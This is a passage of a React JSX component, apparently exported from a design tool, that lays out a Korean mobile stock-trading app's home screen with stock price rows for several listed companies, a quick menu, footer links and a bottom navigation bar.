                                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 17 20">
                                  <g id="HDíë">
                                    <path d={svgPaths.p41b1800} fill="var(--fill-0, #00823D)" id="Vector" />
                                    <path d={svgPaths.p116b500} fill="var(--fill-0, #38D430)" id="Vector_2" />
                                    <path d={svgPaths.p3dc7c300} fill="var(--fill-0, #00AE42)" id="Vector_3" />
                                  </g>
                                </svg>
                              </div>
                            </div>
                            <div className="basis-0 content-stretch flex flex-col grow items-start min-h-px min-w-px relative shrink-0" data-name="종목명&부가정보">
                              <p className="[white-space-collapse:collapse] leading-[24px] not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#333950] text-[16px] text-nowrap w-full" style={{ fontWeight: 500 }}>HD현대일렉트릭</p>
                              <div className="content-stretch flex items-start relative shrink-0 w-full" data-name="종목부가정보">
                                <p className="[white-space-collapse:collapse] basis-0 grow leading-[18px] min-h-px min-w-px not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#888e98] text-[12px] text-nowrap" style={{ fontWeight: 500 }}>거래대금 5,676억</p>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="content-stretch flex flex-col items-end relative shrink-0 w-[80px]" data-name="현재가&등락률_두줄">
                          <p className="leading-[24px] min-w-full not-italic relative shrink-0 text-[#fa2d42] text-[16px] text-right w-[min-content]" style={{ fontWeight: 700 }}>494,250</p>
                          <div className="bg-[#fcf4f4] box-border content-stretch flex gap-[10px] items-center justify-end px-[4px] py-px relative rounded-[4px] shrink-0" data-name="tradingflag_h20">
                            <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#fa2d42] text-[12px] text-nowrap text-right" style={{ fontWeight: 500 }}>
                              <p className="leading-[18px] whitespace-pre">+3.99%</p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* 카카오 */}
                    <div className="bg-white box-border content-stretch flex flex-col gap-[8px] h-[68px] items-start justify-center max-w-[320px] overflow-clip px-0 py-[12px] relative shrink-0 w-full" data-name="tr_list_module">
                      <div className="content-stretch flex gap-[12px] items-center relative shrink-0 w-full" data-name="list_contents">
                        <div className="basis-0 content-stretch flex gap-[4px] grow items-center min-h-px min-w-px relative shrink-0" data-name="left info">
                          <div className="basis-0 content-stretch flex gap-[12px] grow items-center min-h-px min-w-px relative shrink-0" data-name="CI&종목정보">
                            <div className="bg-[#ffcb05] relative rounded-[18px] shrink-0 size-[36px]" data-name="CI">
                              <div className="absolute contents left-1/2 top-[calc(50%-0.44px)] translate-x-[-50%] translate-y-[-50%]" data-name="카카오">
                                <div className="absolute h-[7.864px] left-1/2 top-[calc(50%-0.44px)] translate-x-[-50%] translate-y-[-50%] w-[25.714px]" data-name="_π_ÃæÓ_1">
                                  <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 26 8">
                                    <g clipPath="url(#clip0_1_5263)" id="_Ï_ÃÃ¦Ã_1">
                                      <path d={svgPaths.p2ed4a300} fill="var(--fill-0, black)" id="Vector" />
                                      <path d={svgPaths.p3ad5e00} fill="var(--fill-0, black)" id="Vector_2" />
                                      <path d={svgPaths.p2c4a5600} fill="var(--fill-0, black)" id="Vector_3" />
                                      <path d={svgPaths.p1ca3fc00} fill="var(--fill-0, black)" id="Vector_4" />
                                      <path d={svgPaths.p3ec1880} fill="var(--fill-0, black)" id="Vector_5" />
                                    </g>
                                    <defs>
                                      <clipPath id="clip0_1_5263">
                                        <rect fill="white" height="7.86379" width="25.7143" />
                                      </clipPath>
                                    </defs>
                                  </svg>
                                </div>
                              </div>
                            </div>
                            <div className="basis-0 content-stretch flex flex-col grow items-start min-h-px min-w-px relative shrink-0" data-name="종목명&부가정보">
                              <p className="[white-space-collapse:collapse] leading-[24px] not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#333950] text-[16px] text-nowrap w-full" style={{ fontWeight: 500 }}>카카오</p>
                              <div className="content-stretch flex items-start relative shrink-0 w-full" data-name="종목부가정보">
                                <p className="[white-space-collapse:collapse] basis-0 grow leading-[18px] min-h-px min-w-px not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#888e98] text-[12px] text-nowrap" style={{ fontWeight: 500 }}>거래대금 81.16억</p>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="content-stretch flex flex-col items-end justify-center relative shrink-0 w-[80px]" data-name="현재가&등락률_두줄">
                          <p className="font-['Spoqa_Han_Sans_Neo:Bold',sans-serif] leading-[24px] not-italic relative shrink-0 text-[#333950] text-[16px] text-right w-[72px]" style={{ fontWeight: 700 }}>55,300</p>
                          <div className="bg-[#f4f4f4] box-border content-stretch flex gap-[8px] items-center justify-end px-[4px] py-px relative rounded-[4px] shrink-0" data-name="tradingflag_h20">
                            <div className="flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[#333950] text-[12px] text-nowrap text-right">
                              <p className="leading-[18px] whitespace-pre">0.00%</p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* 삼성바이오로직스 */}
                    <div className="bg-white box-border content-stretch flex flex-col gap-[8px] h-[68px] items-start justify-center max-w-[320px] overflow-clip px-0 py-[12px] relative shrink-0 w-full" data-name="tr_list_module">
                      <div className="content-stretch flex gap-[12px] items-center relative shrink-0 w-full" data-name="list_contents">
                        <div className="basis-0 content-stretch flex gap-[4px] grow items-center min-h-px min-w-px relative shrink-0" data-name="left info">
                          <div className="basis-0 content-stretch flex gap-[12px] grow items-center min-h-px min-w-px relative shrink-0" data-name="CI&종목정보">
                            <div className="bg-[#1428a0] relative rounded-[18px] shrink-0 size-[36px]" data-name="CI">
                              <div className="absolute h-[4.332px] left-[3.86px] top-[15.84px] w-[28.286px]" data-name="삼성">
                                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 29 5">
                                  <g clipPath="url(#clip0_1_5354)" id="ì¼ì±">
                                    <path d={svgPaths.p317e7a80} fill="var(--fill-0, white)" id="Vector" />
                                  </g>
                                  <defs>
                                    <clipPath id="clip0_1_5354">
                                      <rect fill="white" height="4.33236" width="28.2857" />
                                    </clipPath>
                                  </defs>
                                </svg>
                              </div>
                            </div>
                            <div className="basis-0 content-stretch flex flex-col grow items-start min-h-px min-w-px relative shrink-0" data-name="종목명&부가정보">
                              <p className="[white-space-collapse:collapse] font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] leading-[24px] not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#333950] text-[16px] text-nowrap w-full" style={{ fontWeight: 600 }}>삼성바이오로직스</p>
                              <div className="content-stretch flex items-start relative shrink-0 w-full" data-name="종목부가정보">
                                <p className="[white-space-collapse:collapse] basis-0 font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] grow leading-[18px] min-h-px min-w-px not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#888e98] text-[12px] text-nowrap">거래대금 7,965억</p>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="content-stretch flex flex-col items-end relative shrink-0 w-[80px]" data-name="현재가&등락률_두줄">
                          <p className="font-['Spoqa_Han_Sans_Neo:Bold',sans-serif] leading-[24px] min-w-full not-italic relative shrink-0 text-[#fa2d42] text-[16px] text-right w-[min-content]" style={{ fontWeight: 700 }}>1,065,000</p>
                          <div className="bg-[#fcf4f4] box-border content-stretch flex gap-[10px] items-center justify-end px-[4px] py-px relative rounded-[4px] shrink-0" data-name="tradingflag_h20">
                            <div className="flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[#fa2d42] text-[12px] text-nowrap text-right">
                              <p className="leading-[18px] whitespace-pre">+3.99%</p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="h-[10px] relative shrink-0 w-[360px]" data-name="divider">
              <div className="absolute bg-[#f6f6f9] inset-0" data-name="np_00com_dv_360x10_sld.9" />
            </div>

            <div className="absolute left-[240px] size-[76px] top-[14px] z-20 pointer-events-none" data-name="img_08ac_bn_3d_76_move">
              <div className="absolute inset-[-44.74%_-119.74%_-44.74%_-117.11%] mask-alpha mask-intersect mask-no-clip mask-no-repeat mask-position-[89px_34px] mask-size-[76px_76px]" data-name="신한알파0017atm 1" style={{ maskImage: `url('${img}')` }}>
                <img alt="" className="absolute inset-0 max-w-none object-50%-50% object-cover size-full" src={img1} />
              </div>
            </div>
          </div>

          {/* Quick Menu Section */}
          <div className="bg-white box-border content-stretch flex flex-col gap-[20px] items-center px-0 py-[32px] relative shrink-0 w-[360px]" data-name="8">
            <div className="content-stretch flex flex-col gap-[12px] items-center relative shrink-0 w-full">
              <div className="content-stretch flex flex-col gap-[12px] items-start relative shrink-0 w-[320px]">
                <div className="content-stretch flex items-start justify-between relative shrink-0 w-[320px]">
                  <p className="font-['Spoqa_Han_Sans_Neo:Bold',sans-serif] leading-[26px] not-italic relative shrink-0 text-[#111111] text-[18px] text-nowrap tracking-[-0.5px] whitespace-pre font-bold">메뉴 바로가기</p>
                </div>
                <div className="h-[150px] relative shrink-0 w-[320px]" data-name="스크린샷, 2025-10-27 오후 4.21.57 1">
                  <div className="absolute inset-0 overflow-hidden pointer-events-none">
                    <img alt="" className="absolute h-[520.19%] left-[-6.56%] max-w-none top-[-182.09%] w-[112.5%]" src={img20251027421571} />
                  </div>
                </div>
                <div className="absolute bg-[#f3f2f8] h-[20px] left-[17px] top-[78px] w-[68px]" />
                <div className="absolute flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] justify-center leading-[0] left-[50.5px] not-italic text-[#333950] text-[13px] text-center text-nowrap top-[85px] tracking-[-0.65px] translate-x-[-50%] translate-y-[-50%]">
                  <p className="leading-[18px] whitespace-pre font-bold font-normal" style={{ fontWeight: 500 }}>SOL 디지털 월렛</p>
                </div>
              </div>
            </div>
          </div>

          <div className="content-stretch flex flex-col items-center justify-center relative shrink-0">
            <div className="h-[10px] relative shrink-0 w-[360px]" data-name="divider">
              <div className="absolute bg-[#f6f6f9] inset-0" data-name="np_00com_dv_360x10_sld.9" />
            </div>
          </div>
        </div>

        {/* Footer Section */}
        <div className="content-stretch flex flex-col gap-[32px] items-start relative shrink-0 w-full">
          <div className="content-stretch flex flex-col gap-[10px] items-center relative shrink-0 w-full">
            <div className="bg-white box-border content-stretch flex flex-col gap-[4px] h-[30px] items-start justify-center px-[16px] py-[6px] relative rounded-[30px] shrink-0">
              <div aria-hidden="true" className="absolute border border-[#eeeeee] border-solid inset-0 pointer-events-none rounded-[30px]" />
              <div className="content-stretch flex gap-[4px] items-center relative shrink-0 w-full">
                <div className="content-stretch flex flex-col items-end justify-center relative shrink-0">
                  <div className="content-stretch flex gap-[4px] items-center relative shrink-0">
                    <div className="relative shrink-0 size-[6px]" data-name="Oval">
                      <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 6 6">
                        <circle cx="3" cy="3" fill="var(--fill-0, #CCCFD3)" id="Oval" r="3" />
                      </svg>
                    </div>
                    <div className="content-stretch flex items-center relative shrink-0">
                      <div className="flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[#77738c] text-[14px] text-nowrap text-right tracking-[-0.07px]">
                        <p className="leading-[24px] whitespace-pre">금액 숨김 설정</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-[#f6f6f9] box-border content-stretch flex flex-col gap-[24px] items-start pb-[20px] pt-0 px-0 relative shrink-0 w-full" data-name="Footer Menu">
            <div className="content-stretch flex flex-col gap-[24px] items-center relative shrink-0 w-full">
              <div className="relative shrink-0 w-full" data-name="cs_intro_module">
                <div className="flex flex-row items-center size-full">
                  <div className="box-border content-stretch flex items-center justify-between px-[20px] py-0 relative w-full">
                    <div className="content-stretch flex gap-[16px] items-center relative shrink-0" data-name="contents">
                      <div className="overflow-clip relative shrink-0 size-[32px]" data-name="ic_fx_usersurvey_32">
                        <div className="absolute h-[26.667px] left-[calc(100%-16px)] top-[15.33px] translate-x-[-50%] translate-y-[-50%] w-[24px]" data-name="02">
                          <svg className="block max-w-none size-full" preserveAspectRatio="none" width="100%" height="100%" overflow="visible" viewBox="0 0 24 27" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <g>
                              <path d="M1.19209e-07 11.3333H24V22C24 23.4728 22.8061 24.6667 21.3333 24.6667H2.66667C1.19391 24.6667 1.19209e-07 23.4728 1.19209e-07 22V11.3333Z" fill="#1644B3" />
                              <path d="M10.2284 2.24146C11.2387 1.34336 12.7613 1.34336 13.7716 2.24146L24 11.3333H1.19209e-07L10.2284 2.24146Z" fill="#205CD7" />
                              <g>
                                <path d="M2 2.66667C2 1.19391 3.19391 5.96046e-08 4.66667 5.96046e-08H19.3333C20.8061 5.96046e-08 22 1.19391 22 2.66667V19.3333C22 20.8061 20.8061 22 19.3333 22H4.66667C3.19391 22 2 20.8061 2 19.3333V2.66667Z" fill="white" />
                                <path d="M6 5.33333H15.3333" stroke="#5D6378" strokeWidth="2" strokeLinecap="round" />
                                <path d="M6 9.33333H10" stroke="#5D6378" strokeWidth="2" strokeLinecap="round" />
                              </g>
                              <path d="M1.19209e-07 12L16.9918 23.6819C18.316 24.5923 17.6717 26.6667 16.0648 26.6667H2.66667C1.19391 26.6667 1.19209e-07 25.4728 1.19209e-07 24V12Z" fill="#80B7FD" />
                              <path d="M24 12V24C24 25.4728 22.8061 26.6667 21.3333 26.6667H2.66667L24 12Z" fill="#619FFB" />
                            </g>
                          </svg>
                        </div>
                      </div>
                      <div className="content-stretch flex flex-col items-start not-italic relative shrink-0 text-nowrap" data-name="txt">
                        <div className="flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] justify-center leading-[0] relative shrink-0 text-[#777e8c] text-[12px]">
                          <p className="leading-[18px] text-nowrap whitespace-pre">지금까지 경험은 어떠셨나요?</p>
                        </div>
                        <p className="font-['Spoqa_Han_Sans_Neo:Bold',sans-serif] leading-[24px] relative shrink-0 text-[#333950] text-[16px] tracking-[-0.5px] whitespace-pre font-bold">고객님의 의견이 궁금해요!</p>
                      </div>
                    </div>
                    <div className="flex items-center justify-center relative shrink-0">
                      <div className="flex-none scale-y-[-100%]">
                        <div className="relative size-[20px]" data-name="ic_00com_20_line_arrow">
                          <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 20 20">
                            <g id="ic_00com_20_line1.25_right_333950">
                              <g id="gudie"></g>
                              <path d={svgPaths.p1b1d8200} id="Path" stroke="var(--stroke-0, #777E8C)" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.25" />
                            </g>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="h-px relative shrink-0 w-[320px]" data-name="divider">
                <div className="absolute bg-[#eeeeee] inset-0" data-name="np_00com_dv_320x1_sld.9" />
              </div>
            </div>

            <div className="content-stretch flex flex-col gap-[12px] items-start relative shrink-0 w-full">
              <div className="relative shrink-0 w-full">
                <div className="flex flex-row items-center size-full">
                  <div className="box-border content-stretch flex gap-[8px] items-center px-[20px] py-0 relative w-full">
                    <p className="font-['Spoqa_Han_Sans_Neo:Bold',sans-serif] leading-[20px] not-italic relative shrink-0 text-[#777e8c] text-[13px] text-nowrap whitespace-pre font-bold">개인정보처리방침</p>
                    <div className="bg-[#cccfd3] h-[8px] shrink-0 w-px" />
                    <div className="flex flex-col font-['Spoqa_Han_Sans_Neo:Bold',sans-serif] justify-center leading-[0] not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#777e8c] text-[13px] text-nowrap">
                      <p className="leading-[20px] overflow-ellipsis overflow-hidden whitespace-pre font-bold">신용정보활용체제</p>
                    </div>
                  </div>
                </div>
              </div>
              <div className="relative shrink-0 w-full">
                <div className="flex flex-row items-center size-full">
                  <div className="box-border content-stretch flex gap-[4px] items-center px-[20px] py-0 relative w-full">
                    <div className="basis-0 content-stretch flex gap-[8px] grow items-center min-h-px min-w-px relative shrink-0">
                      <p className="font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] leading-[20px] not-italic relative shrink-0 text-[#777e8c] text-[13px] text-nowrap whitespace-pre">투자 유의사항</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Bottom Navigation */}
      <div className="absolute h-[52px] left-0 bottom-0 w-[360px] bg-white z-10" data-name="inner">
        <div className="absolute content-stretch flex items-start left-[8px] top-0" data-name="menu">
          {/* Home Tab */}
          <div className="relative shrink-0 size-[52px]" data-name="1">
            <div className="absolute contents left-0 top-0" data-name="Group829739">
              <div className="absolute left-0 size-[52px] top-0" data-name="Rectangle157299">
                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 52 52">
                  <path d="M0 0H52V52H0V0Z" fill="var(--fill-0, white)" id="Rectangle157299" />
                </svg>
              </div>
              <div className="absolute flex flex-col font-['Spoqa_Han_Sans_Neo:Bold',sans-serif] inset-[30.77%_38.46%] justify-center leading-[0] not-italic text-[#2a3fec] text-[13px] text-center text-nowrap">
                <p className="leading-[20px] whitespace-pre">홈</p>
              </div>
            </div>
          </div>

          {/* Other tabs */}
          <div className="relative shrink-0 size-[52px]" data-name="2">
            <div className="absolute contents left-0 top-0" data-name="Group830148">
              <div className="absolute left-0 size-[52px] top-0" data-name="Rectangle157471">
                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 52 52">
                  <path d="M0 0H52V52H0V0Z" fill="var(--fill-0, white)" id="Rectangle157299" />
                </svg>
              </div>
              <div className="absolute flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] inset-[30.77%_26.92%] justify-center leading-[0] not-italic text-[#333950] text-[13px] text-center text-nowrap">
                <p className="leading-[20px] whitespace-pre">관심</p>
              </div>
            </div>
          </div>

          <div className="relative shrink-0 size-[52px]" data-name="3">
            <div className="absolute contents left-0 top-0" data-name="Group829740">
              <div className="absolute left-0 size-[52px] top-0" data-name="Rectangle157299">
                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 52 52">
                  <path d="M0 0H52V52H0V0Z" fill="var(--fill-0, white)" id="Rectangle157299" />
                </svg>
              </div>
              <div className="absolute flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] inset-[30.77%_15.38%] justify-center leading-[0] not-italic text-[#333950] text-[13px] text-center text-nowrap">
                <p className="leading-[20px] whitespace-pre">현재가</p>
              </div>
            </div>
          </div>

          <div className="relative shrink-0 size-[52px]" data-name="4">
            <div className="absolute contents left-0 top-0" data-name="Group829741">
              <div className="absolute left-0 size-[52px] top-0" data-name="Rectangle157299">
                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 52 52">
                  <path d="M0 0H52V52H0V0Z" fill="var(--fill-0, white)" id="Rectangle157299" />
                </svg>
              </div>
              <div className="absolute flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] inset-[30.77%_26.92%] justify-center leading-[0] not-italic text-[#333950] text-[13px] text-center text-nowrap">
                <p className="leading-[20px] whitespace-pre">주문</p>
              </div>
            </div>
          </div>

          <div className="relative shrink-0 size-[52px]" data-name="5">
            <div className="absolute contents left-0 top-0" data-name="Group829742">
              <div className="absolute left-0 size-[52px] top-0" data-name="Rectangle157299">
                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 52 52">
                  <path d="M0 0H52V52H0V0Z" fill="var(--fill-0, white)" id="Rectangle157299" />
                </svg>
              </div>
              <div className="absolute flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] inset-[30.77%_26.92%] justify-center leading-[0] not-italic text-[#333950] text-[13px] text-center text-nowrap">
                <p className="leading-[20px] whitespace-pre">잔고</p>
              </div>
            </div>
          </div>

          {/* Settings Button */}
          <div className="bg-white box-border content-stretch flex gap-[10px] items-start px-[8px] py-[14px] relative shrink-0" data-name="7">
            <div className="relative shrink-0 size-[24px]" data-name="ic_00com_qm_24_sld_setting">
              <div className="absolute inset-[16.667%] mask-alpha mask-intersect mask-no-clip mask-no-repeat mask-position-[-4px] mask-size-[24px_24px]" style={{ maskImage: `url('${img3}')` }}>
                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 16 16">
                  <g id="Group 822201">
                    <path d={svgPaths.p1560c340} fill="var(--fill-0, #777E8C)" id="Subtract" />
                    <path clipRule="evenodd" d={svgPaths.p2fbfa000} fill="var(--fill-0, white)" fillRule="evenodd" id="Subtract_2" />
                  </g>
                </svg>
              </div>
            </div>
          </div>

          <MenuButtonWithLogic onNavigateMenu={onNavigateMenu} />
        </div>

        <div className="absolute inset-[1.92%_12.22%_1.92%_81.11%]" data-name="img_00com_qm_24">
          <div className="absolute flex inset-0 items-center justify-center">
            <div className="flex-none h-[50px] rotate-[180deg] scale-y-[-100%] w-[24px]">
              <div className="bg-gradient-to-r from-[#ffffff] from-[60.417%] size-full to-[rgba(255,255,255,0)]" data-name="dim" />
            </div>
          </div>
          <div className="absolute left-[4px] size-[16px] top-[17px]" data-name="img_00com_qm_24_nextarrow">
            <div className="absolute inset-0" data-name="ic_00com_16_line_arrow">
              <div className="absolute left-0 size-[16px] top-0" data-name="ic_00com_16_line_right_999ea4">
                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 16 16">
                  <g id="ic_00com_16_line_right_999ea4">
                    <g id="gudie"></g>
                    <path d={svgPaths.p1bae7780} id="Path" stroke="var(--stroke-0, #999EA4)" strokeLinecap="round" strokeLinejoin="round" />
                  </g>
                </svg>
              </div>
            </div>
          </div>
        </div>

        <div className="absolute bottom-0 h-px left-0 w-[360px]" data-name="divider">
          <div className="absolute bg-[#eeeeee] inset-0" />
        </div>
        <div className="absolute h-px left-0 top-0 w-[360px]" data-name="divider">
          <div className="absolute bg-[#f4f4f4] inset-0" />
        </div>
      </div>

      <MobileAppFooter activeTab="home" onOpenMenu={onNavigateMenu} onNavigateOrder={onNavigateMenu} />
    </div>
  );
}
